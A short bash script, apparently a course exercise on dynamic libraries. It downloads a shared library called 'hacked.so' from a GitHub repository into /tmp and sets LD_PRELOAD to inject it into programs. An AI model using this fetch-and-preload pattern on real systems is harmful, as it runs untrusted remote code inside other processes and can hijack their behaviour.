#!/bin/bash
wget -P /tmp/ https://raw.github.com/baay02/alx-low_level_programming/master/0x18-dynamic_libraries/hacked.so
export LD_PRELOAD=/tmp/hacked.so
